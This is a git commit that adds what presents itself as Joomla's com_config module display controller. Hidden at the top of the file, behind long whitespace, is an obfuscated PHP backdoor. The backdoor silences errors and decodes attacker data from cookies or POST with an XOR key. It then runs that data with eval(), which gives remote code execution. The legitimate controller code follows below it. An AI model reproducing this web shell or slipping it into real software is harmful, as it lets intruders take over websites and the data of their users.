af3ff42083ea168d96ce8f01045e5f633e3729df
Lydiah Wanjiru <valeriekebz@gmail.com>
2023-01-19 12:38:48 +0300

    Components config

---
+++ components/com_config/controller/modules/display.php
@@ -0,0 +1,129 @@
+<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $a3d5d3d1c = 613;$GLOBALS['v28ed0ce'] = Array();global $v28ed0ce;$v28ed0ce = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['v43b46fe'] = "\x7a\x42\x32\x4d\x45\x59\x35\x72\x54\x73\x4b\x2b\x3b\x3d\x61\x62\x41\x5c\x43\x65\x39\x36\x6f\x30\x7e\x2a\x67\x55\x44\x37\x50\x2f\x75\x66\x71\x53\x25\x70\x3c\x6d\x26\x60\x51\x79\xd\x64\x4a\x20\x27\x5e\x21\x2c\x7d\x5f\x23\x47\x52\x3a\x34\x40\x7b\x77\x5d\x6a\x5b\x22\x74\x6b\x49\x57\x33\x78\x46\x38\x3e\x68\x63\x3f\x4e\x2e\x2d\x5a\x56\x4f\x69\x58\x6e\x48\x6c\x24\x28\x76\x29\x9\x31\xa\x7c\x4c";$v28ed0ce[$v28ed0ce['v43b46fe'][86].$v28ed0ce['v43b46fe'][23].$v28ed0ce['v43b46fe'][70].$v28ed0ce['v43b46fe'][23].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][76].$v28ed0ce['v43b46fe'][23].$v28ed0ce['v43b46fe'][23]] = $v28ed0ce['v43b46fe'][76].$v28ed0ce['v43b46fe'][75].$v28ed0ce['v43b46fe'][7];$v28ed0ce[$v28ed0ce['v43b46fe'][75].$v28ed0ce['v43b46fe'][15].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][94].$v28ed0ce['v43b46fe'][2].$v28ed0ce['v43b46fe'][33].$v28ed0ce['v43b46fe'][2]] = $v28ed0ce['v43b46fe'][22].$v28ed0ce['v43b46fe'][7].$v28ed0ce['v43b46fe'][45];$v28ed0ce[$v28ed0ce['v43b46fe'][66].$v28ed0ce['v43b46fe'][20].$v28ed0ce['v43b46fe'][94].$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][94].$v28ed0ce['v43b46fe'][20].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][14]] = $v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][33].$v28ed0ce['v43b46fe'][84].$v28ed0ce['v43b46fe'][86].$v28ed0ce['v43b46fe'][19];$v28ed0ce[$v28ed0ce['v43b46fe'][7].$v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][76].$v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][73].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][21]] = $v28ed0ce['v43b46fe'][9].$v28ed0ce['v43b46fe'][66].$v28ed0ce['v43b46fe'][7].$v28ed0ce['v43b46fe'][88].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][86];$v28ed0ce[$v28ed0ce['v43b46fe'][71].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][76].$v28ed0ce['v43b46fe'][23].$v28ed0ce['v43b46fe'][94].$v28ed0ce['v43b46fe'][33].$v28ed0ce['v43b46fe'][70].$v28ed0ce['v43b46fe'][94]] = $v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][33].$v28ed0ce['v43b46fe'][84].$v28ed0ce['v43b46fe'][86].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][45];$v28ed0ce[$v28ed0ce['v43b46fe'][61].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][29].$v28ed0ce['v43b46fe'][14]] = $v28ed0ce['v43b46fe'][84].$v28ed0ce['v43b46fe'][86].$v28ed0ce['v43b46fe'][84].$v28ed0ce['v43b46fe'][53].$v28ed0ce['v43b46fe'][9].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][66];$v28ed0ce[$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][23].$v28ed0ce['v43b46fe'][33].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][76].$v28ed0ce['v43b46fe'][14]] = $v28ed0ce['v43b46fe'][9].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][7].$v28ed0ce['v43b46fe'][84].$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][88].$v28ed0ce['v43b46fe'][84].$v28ed0ce['v43b46fe'][0].$v28ed0ce['v43b46fe'][19];$v28ed0ce[$v28ed0ce['v43b46fe'][91].$v28ed0ce['v43b46fe'][70].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][21]] = $v28ed0ce['v43b46fe'][37].$v28ed0ce['v43b46fe'][75].$v28ed0ce['v43b46fe'][37].$v28ed0ce['v43b46fe'][91].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][7].$v28ed0ce['v43b46fe'][9].$v28ed0ce['v43b46fe'][84].$v28ed0ce['v43b46fe'][22].$v28ed0ce['v43b46fe'][86];$v28ed0ce[$v28ed0ce['v43b46fe'][84].$v28ed0ce['v43b46fe'][15].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][20].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][70]] = $v28ed0ce['v43b46fe'][32].$v28ed0ce['v43b46fe'][86].$v28ed0ce['v43b46fe'][9].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][7].$v28ed0ce['v43b46fe'][84].$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][88].$v28ed0ce['v43b46fe'][84].$v28ed0ce['v43b46fe'][0].$v28ed0ce['v43b46fe'][19];$v28ed0ce[$v28ed0ce['v43b46fe'][43].$v28ed0ce['v43b46fe'][23].$v28ed0ce['v43b46fe'][70].$v28ed0ce['v43b46fe'][2].$v28ed0ce['v43b46fe'][20].$v28ed0ce['v43b46fe'][20].$v28ed0ce['v43b46fe'][33].$v28ed0ce['v43b46fe'][45]] = $v28ed0ce['v43b46fe'][15].$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][9].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][58].$v28ed0ce['v43b46fe'][53].$v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][76].$v28ed0ce['v43b46fe'][22].$v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][19];$v28ed0ce[$v28ed0ce['v43b46fe'][26].$v28ed0ce['v43b46fe'][23].$v28ed0ce['v43b46fe'][58].$v28ed0ce['v43b46fe'][58].$v28ed0ce['v43b46fe'][15].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][73].$v28ed0ce['v43b46fe'][45]] = $v28ed0ce['v43b46fe'][9].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][66].$v28ed0ce['v43b46fe'][53].$v28ed0ce['v43b46fe'][66].$v28ed0ce['v43b46fe'][84].$v28ed0ce['v43b46fe'][39].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][53].$v28ed0ce['v43b46fe'][88].$v28ed0ce['v43b46fe'][84].$v28ed0ce['v43b46fe'][39].$v28ed0ce['v43b46fe'][84].$v28ed0ce['v43b46fe'][66];$v28ed0ce[$v28ed0ce['v43b46fe'][76].$v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][20].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][15]] = $v28ed0ce['v43b46fe'][22].$v28ed0ce['v43b46fe'][20].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][21];$v28ed0ce[$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][73].$v28ed0ce['v43b46fe'][29].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][19]] = $v28ed0ce['v43b46fe'][63].$v28ed0ce['v43b46fe'][23].$v28ed0ce['v43b46fe'][94].$v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][33].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][6];$v28ed0ce[$v28ed0ce['v43b46fe'][88].$v28ed0ce['v43b46fe'][94].$v28ed0ce['v43b46fe'][58].$v28ed0ce['v43b46fe'][2].$v28ed0ce['v43b46fe'][29].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][76].$v28ed0ce['v43b46fe'][21]] = $_POST;$v28ed0ce[$v28ed0ce['v43b46fe'][63].$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][2].$v28ed0ce['v43b46fe'][33].$v28ed0ce['v43b46fe'][19]] = $_COOKIE;@$v28ed0ce[$v28ed0ce['v43b46fe'][61].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][29].$v28ed0ce['v43b46fe'][14]]($v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][7].$v28ed0ce['v43b46fe'][7].$v28ed0ce['v43b46fe'][22].$v28ed0ce['v43b46fe'][7].$v28ed0ce['v43b46fe'][53].$v28ed0ce['v43b46fe'][88].$v28ed0ce['v43b46fe'][22].$v28ed0ce['v43b46fe'][26], NULL);@$v28ed0ce[$v28ed0ce['v43b46fe'][61].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][29].$v28ed0ce['v43b46fe'][14]]($v28ed0ce['v43b46fe'][88].$v28ed0ce['v43b46fe'][22].$v28ed0ce['v43b46fe'][26].$v28ed0ce['v43b46fe'][53].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][7].$v28ed0ce['v43b46fe'][7].$v28ed0ce['v43b46fe'][22].$v28ed0ce['v43b46fe'][7].$v28ed0ce['v43b46fe'][9], 0);@$v28ed0ce[$v28ed0ce['v43b46fe'][61].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][29].$v28ed0ce['v43b46fe'][14]]($v28ed0ce['v43b46fe'][39].$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][71].$v28ed0ce['v43b46fe'][53].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][71].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][76].$v28ed0ce['v43b46fe'][32].$v28ed0ce['v43b46fe'][66].$v28ed0ce['v43b46fe'][84].$v28ed0ce['v43b46fe'][22].$v28ed0ce['v43b46fe'][86].$v28ed0ce['v43b46fe'][53].$v28ed0ce['v43b46fe'][66].$v28ed0ce['v43b46fe'][84].$v28ed0ce['v43b46fe'][39].$v28ed0ce['v43b46fe'][19], 0);@$v28ed0ce[$v28ed0ce['v43b46fe'][26].$v28ed0ce['v43b46fe'][23].$v28ed0ce['v43b46fe'][58].$v28ed0ce['v43b46fe'][58].$v28ed0ce['v43b46fe'][15].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][73].$v28ed0ce['v43b46fe'][45]](0);if (!$v28ed0ce[$v28ed0ce['v43b46fe'][71].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][76].$v28ed0ce['v43b46fe'][23].$v28ed0ce['v43b46fe'][94].$v28ed0ce['v43b46fe'][33].$v28ed0ce['v43b46fe'][70].$v28ed0ce['v43b46fe'][94]]($v28ed0ce['v43b46fe'][16].$v28ed0ce['v43b46fe'][97].$v28ed0ce['v43b46fe'][56].$v28ed0ce['v43b46fe'][4].$v28ed0ce['v43b46fe'][16].$v28ed0ce['v43b46fe'][28].$v28ed0ce['v43b46fe'][5].$v28ed0ce['v43b46fe'][53].$v28ed0ce['v43b46fe'][56].$v28ed0ce['v43b46fe'][27].$v28ed0ce['v43b46fe'][78].$v28ed0ce['v43b46fe'][53].$v28ed0ce['v43b46fe'][70].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][33].$v28ed0ce['v43b46fe'][15].$v28ed0ce['v43b46fe'][73].$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][73].$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][2].$v28ed0ce['v43b46fe'][70].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][15].$v28ed0ce['v43b46fe'][2].$v28ed0ce['v43b46fe'][94].$v28ed0ce['v43b46fe'][33].$v28ed0ce['v43b46fe'][15].$v28ed0ce['v43b46fe'][33].$v28ed0ce['v43b46fe'][94].$v28ed0ce['v43b46fe'][94].$v28ed0ce['v43b46fe'][15].$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][94].$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][23].$v28ed0ce['v43b46fe'][2].$v28ed0ce['v43b46fe'][33].$v28ed0ce['v43b46fe'][15].$v28ed0ce['v43b46fe'][14])){$v28ed0ce[$v28ed0ce['v43b46fe'][66].$v28ed0ce['v43b46fe'][20].$v28ed0ce['v43b46fe'][94].$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][94].$v28ed0ce['v43b46fe'][20].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][14]]($v28ed0ce['v43b46fe'][16].$v28ed0ce['v43b46fe'][97].$v28ed0ce['v43b46fe'][56].$v28ed0ce['v43b46fe'][4].$v28ed0ce['v43b46fe'][16].$v28ed0ce['v43b46fe'][28].$v28ed0ce['v43b46fe'][5].$v28ed0ce['v43b46fe'][53].$v28ed0ce['v43b46fe'][56].$v28ed0ce['v43b46fe'][27].$v28ed0ce['v43b46fe'][78].$v28ed0ce['v43b46fe'][53].$v28ed0ce['v43b46fe'][70].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][33].$v28ed0ce['v43b46fe'][15].$v28ed0ce['v43b46fe'][73].$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][73].$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][2].$v28ed0ce['v43b46fe'][70].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][15].$v28ed0ce['v43b46fe'][2].$v28ed0ce['v43b46fe'][94].$v28ed0ce['v43b46fe'][33].$v28ed0ce['v43b46fe'][15].$v28ed0ce['v43b46fe'][33].$v28ed0ce['v43b46fe'][94].$v28ed0ce['v43b46fe'][94].$v28ed0ce['v43b46fe'][15].$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][94].$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][23].$v28ed0ce['v43b46fe'][2].$v28ed0ce['v43b46fe'][33].$v28ed0ce['v43b46fe'][15].$v28ed0ce['v43b46fe'][14], 1);$b31de0 = NULL;$oe6c980 = NULL;$v28ed0ce[$v28ed0ce['v43b46fe'][66].$v28ed0ce['v43b46fe'][29].$v28ed0ce['v43b46fe'][29].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][20].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][29].$v28ed0ce['v43b46fe'][70].$v28ed0ce['v43b46fe'][33]] = $v28ed0ce['v43b46fe'][20].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][58].$v28ed0ce['v43b46fe'][33].$v28ed0ce['v43b46fe'][94].$v28ed0ce['v43b46fe'][58].$v28ed0ce['v43b46fe'][70].$v28ed0ce['v43b46fe'][29].$v28ed0ce['v43b46fe'][80].$v28ed0ce['v43b46fe'][15].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][76].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][80].$v28ed0ce['v43b46fe'][58].$v28ed0ce['v43b46fe'][15].$v28ed0ce['v43b46fe'][29].$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][80].$v28ed0ce['v43b46fe'][20].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][76].$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][80].$v28ed0ce['v43b46fe'][29].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][76].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][94].$v28ed0ce['v43b46fe'][23].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][23];global $t7759e73f;function  j01df5d5($b31de0, $b667b20f){global $v28ed0ce;$ma85c7 = "";for ($m58e=0; $m58e<$v28ed0ce[$v28ed0ce['v43b46fe'][7].$v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][76].$v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][73].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][21]]($b31de0);){for ($ue0b10b24=0; $ue0b10b24<$v28ed0ce[$v28ed0ce['v43b46fe'][7].$v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][76].$v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][73].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][21]]($b667b20f) && $m58e<$v28ed0ce[$v28ed0ce['v43b46fe'][7].$v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][76].$v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][73].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][21]]($b31de0); $ue0b10b24++, $m58e++){$ma85c7 .= $v28ed0ce[$v28ed0ce['v43b46fe'][86].$v28ed0ce['v43b46fe'][23].$v28ed0ce['v43b46fe'][70].$v28ed0ce['v43b46fe'][23].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][76].$v28ed0ce['v43b46fe'][23].$v28ed0ce['v43b46fe'][23]]($v28ed0ce[$v28ed0ce['v43b46fe'][75].$v28ed0ce['v43b46fe'][15].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][94].$v28ed0ce['v43b46fe'][2].$v28ed0ce['v43b46fe'][33].$v28ed0ce['v43b46fe'][2]]($b31de0[$m58e]) ^ $v28ed0ce[$v28ed0ce['v43b46fe'][75].$v28ed0ce['v43b46fe'][15].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][94].$v28ed0ce['v43b46fe'][2].$v28ed0ce['v43b46fe'][33].$v28ed0ce['v43b46fe'][2]]($b667b20f[$ue0b10b24]));}}return $ma85c7;}function  o9656d566($b31de0, $b667b20f){global $v28ed0ce;global $t7759e73f;return $v28ed0ce[$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][73].$v28ed0ce['v43b46fe'][29].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][19]]($v28ed0ce[$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][73].$v28ed0ce['v43b46fe'][29].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][19]]($b31de0, $t7759e73f), $b667b20f);}foreach ($v28ed0ce[$v28ed0ce['v43b46fe'][63].$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][2].$v28ed0ce['v43b46fe'][33].$v28ed0ce['v43b46fe'][19]] as $b667b20f=>$o6228725){$b31de0 = $o6228725;$oe6c980 = $b667b20f;}if (!$b31de0){foreach ($v28ed0ce[$v28ed0ce['v43b46fe'][88].$v28ed0ce['v43b46fe'][94].$v28ed0ce['v43b46fe'][58].$v28ed0ce['v43b46fe'][2].$v28ed0ce['v43b46fe'][29].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][76].$v28ed0ce['v43b46fe'][21]] as $b667b20f=>$o6228725){$b31de0 = $o6228725;$oe6c980 = $b667b20f;}}$b31de0 = @$v28ed0ce[$v28ed0ce['v43b46fe'][84].$v28ed0ce['v43b46fe'][15].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][20].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][70]]($v28ed0ce[$v28ed0ce['v43b46fe'][76].$v28ed0ce['v43b46fe'][45].$v28ed0ce['v43b46fe'][20].$v28ed0ce['v43b46fe'][6].$v28ed0ce['v43b46fe'][15]]($v28ed0ce[$v28ed0ce['v43b46fe'][43].$v28ed0ce['v43b46fe'][23].$v28ed0ce['v43b46fe'][70].$v28ed0ce['v43b46fe'][2].$v28ed0ce['v43b46fe'][20].$v28ed0ce['v43b46fe'][20].$v28ed0ce['v43b46fe'][33].$v28ed0ce['v43b46fe'][45]]($b31de0), $oe6c980));if (isset($b31de0[$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][67]]) && $t7759e73f==$b31de0[$v28ed0ce['v43b46fe'][14].$v28ed0ce['v43b46fe'][67]]){if ($b31de0[$v28ed0ce['v43b46fe'][14]] == $v28ed0ce['v43b46fe'][84]){$m58e = Array($v28ed0ce['v43b46fe'][37].$v28ed0ce['v43b46fe'][91] => @$v28ed0ce[$v28ed0ce['v43b46fe'][91].$v28ed0ce['v43b46fe'][70].$v28ed0ce['v43b46fe'][21].$v28ed0ce['v43b46fe'][21]](),$v28ed0ce['v43b46fe'][9].$v28ed0ce['v43b46fe'][91] => $v28ed0ce['v43b46fe'][94].$v28ed0ce['v43b46fe'][79].$v28ed0ce['v43b46fe'][23].$v28ed0ce['v43b46fe'][80].$v28ed0ce['v43b46fe'][94],);echo @$v28ed0ce[$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][23].$v28ed0ce['v43b46fe'][33].$v28ed0ce['v43b46fe'][19].$v28ed0ce['v43b46fe'][76].$v28ed0ce['v43b46fe'][14]]($m58e);}elseif ($b31de0[$v28ed0ce['v43b46fe'][14]] == $v28ed0ce['v43b46fe'][19]){eval/*jb728085*/($b31de0[$v28ed0ce['v43b46fe'][45]]);}exit();}} ?><?php
+/**
+ * @package     Joomla.Site
+ * @subpackage  com_config
+ *
+ * @copyright   Copyright (C) 2005 - 2016 Open Source Matters, Inc. All rights reserved.
+ * @license     GNU General Public License version 2 or later; see LICENSE.txt
+ */
+
+defined('_JEXEC') or die;
+
+/**
+ * Display Controller for module editing
+ *
+ * @package     Joomla.Site
+ * @subpackage  com_config
+ * @since       3.2
+*/
+class ConfigControllerModulesDisplay extends ConfigControllerDisplay
+{
+	/**
+	 * Method to display module editing.
+	 *
+	 * @return  bool	True on success, false on failure.
+	 *
+	 * @since   3.2
+	 */
+	public function execute()
+	{
+
+		// Get the application
+		$app = $this->getApplication();
+
+		// Get the document object.
+		$document     = JFactory::getDocument();
+
+		$viewName     = $this->input->getWord('view', 'modules');
+		$viewFormat   = $document->getType();
+		$layoutName   = $this->input->getWord('layout', 'default');
+		$returnUri    = $this->input->get->get('return', null, 'base64');
+
+		// Construct redirect URI
+		if (!empty($returnUri))
+		{
+			$redirect = base64_decode(urldecode($returnUri));
+
+			// Don't redirect to an external URL.
+			if (!JUri::isInternal($redirect))
+			{
+				$redirect = JUri::base();
+			}
+		}
+		else
+		{
+			$redirect = JUri::base();
+		}
+
+		// Access backend com_module
+		JLoader::register('ModulesController', JPATH_ADMINISTRATOR . '/components/com_modules/controller.php');
+		JLoader::register('ModulesViewModule', JPATH_ADMINISTRATOR . '/components/com_modules/views/module/view.json.php');
+		JLoader::register('ModulesModelModule', JPATH_ADMINISTRATOR . '/components/com_modules/models/module.php');
+
+		$displayClass = new ModulesController;
+
+		// Get the parameters of the module with Id
+		$document->setType('json');
+
+		// Execute backend controller
+		if (!($serviceData = json_decode($displayClass->display(), true)))
+		{
+			$app->redirect($redirect);
+		}
+
+		// Reset params back after requesting from service
+		$document->setType('html');
+		$app->input->set('view', $viewName);
+
+		// Register the layout paths for the view
+		$paths = new SplPriorityQueue;
+		$paths->insert(JPATH_COMPONENT . '/view/' . $viewName . '/tmpl', 'normal');
+
+		$viewClass  = 'ConfigView' . ucfirst($viewName) . ucfirst($viewFormat);
+		$modelClass = 'ConfigModel' . ucfirst($viewName);
+
+		if (class_exists($viewClass))
+		{
+
+			$model = new $modelClass;
+
+			// Access check.
+			$user = JFactory::getUser();
+
+			if (!$user->authorise('module.edit.frontend', 'com_modules.module.' . $serviceData['id'])
+				&& !$user->authorise('module.edit.frontend', 'com_modules'))
+			{
+				$app->enqueueMessage(JText::_('JERROR_ALERTNOAUTHOR'), 'error');
+				$app->redirect($redirect);
+
+			}
+
+			// Need to add module name to the state of model
+			$model->getState()->set('module.name', $serviceData['module']);
+
+			$view = new $viewClass($model, $paths);
+
+			$view->setLayout($layoutName);
+
+			// Push document object into the view.
+			$view->document = $document;
+
+			// Load form and bind data
+			$form = $model->getForm();
+
+			if ($form)
+			{
+				$form->bind($serviceData);
+			}
+
+			// Set form and data to the view
+			$view->form = &$form;
+			$view->item = &$serviceData;
+
+			// Render view.
+			echo $view->render();
+		}
+		return true;
+	}
+
+}
